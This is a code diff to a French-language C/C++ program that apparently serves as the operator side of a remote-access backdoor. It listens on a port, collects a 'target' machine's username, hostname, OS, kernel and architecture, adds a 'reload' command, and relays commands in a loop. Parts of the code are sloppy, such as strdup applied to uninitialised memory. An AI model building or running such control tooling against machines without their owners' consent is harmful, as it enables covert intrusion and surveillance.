@@ -8,14 +8,19 @@ int main()
     char result[8192] = "";
     char *username;
     username = (char *) malloc(sizeof(buffer_rcv));
+    char *usernameInit = strdup(username);
     char *hostname;
     hostname = (char *) malloc(sizeof(buffer_rcv));
+    char *hostnameInit = strdup(hostname);
     char *osVersion;
     osVersion = (char *) malloc(sizeof(buffer_rcv));
+    char *osVersionInit = strdup(osVersion);
     char *kernel;
     kernel = (char *) malloc(sizeof(buffer_rcv));
+    char *kernelInit = strdup(kernel);
     char *arch;
     arch = (char *) malloc(sizeof(buffer_rcv));
+    char *archInit = strdup(arch);
 
     SocketType sock = Listen(portTarget);
     recv(sock, buffer_rcv, sizeof(buffer_rcv), 0);
@@ -27,35 +32,24 @@ int main()
         return 0;
     }
 
+    usleep(100000);
     if (recv(sock, buffer_rcv, sizeof(buffer_rcv), 0) < 0) {
         printf(RED "[!] Erreur lors de la récupération de l'username." RESET);
     }
-    char *data = strtok(buffer_rcv, DELIMITER);
-    if (data != nullptr) {
-        strcpy(username, data);
+
+    Reload(buffer_rcv, username, hostname, osVersion, kernel, arch);
+
+    if (strcmp(username, usernameInit) == 0 || strcmp(hostname, hostnameInit) == 0 || strcmp(osVersion, osVersionInit) == 0 || strcmp(kernel, kernelInit) == 0 ||
+            strcmp(arch, archInit) == 0) {
+        printf(YELLOW "[ ] Une ou plusieurs informations n'ont pas été correctement récupéré utilisez la commande reload pour mettre à jour.\n" RESET);
+        strcpy(username, "Unknow");
+        strcpy(hostname, "Unknow");
+        strcpy(osVersion, "Unknow");
+        strcpy(kernel, "Unknow");
+        strcpy(arch, "Unknow");
     }
 
-    data = strtok(nullptr, DELIMITER);
-    if (data != nullptr) {
-        strcpy(hostname, data);
-    }
-
-    data = strtok(nullptr, DELIMITER);
-    if (data != nullptr) {
-        strcpy(osVersion, data);
-    }
-
-    data = strtok(nullptr, DELIMITER);
-    if (data != nullptr) {
-        strcpy(kernel, data);
-    }
-
-    data = strtok(nullptr, DELIMITER);
-    if (data != nullptr) {
-        strcpy(arch, data);
-    }
-
-    printf(BLUE "[i] Informations sur la cible :\n" RESET);
+    printf(BLUE "[i] Informations sur de la cible :\n" RESET);
     SysInfo(hostname, username, osVersion, kernel, arch);
 
     while (true) {
@@ -85,6 +79,13 @@ int main()
             if (recv(sock, buffer_rcv, sizeof(buffer_rcv), 0) < 0) {
                 printf(RED "[!] Erreur lors de la récupération de la commande." RESET);
             }
+        }
+
+        if (strcmp(command, "reload") == 0) {
+            Reload(buffer_rcv, username, hostname, osVersion, kernel, arch);
+            printf(BLUE "[i] Informations sur de la cible mise à jour :\n" RESET);
+            SysInfo(hostname, username, osVersion, kernel, arch);
+            continue;
         }
 
         if (strcmp(buffer_rcv, "C 3$t v1d3") == 0) {
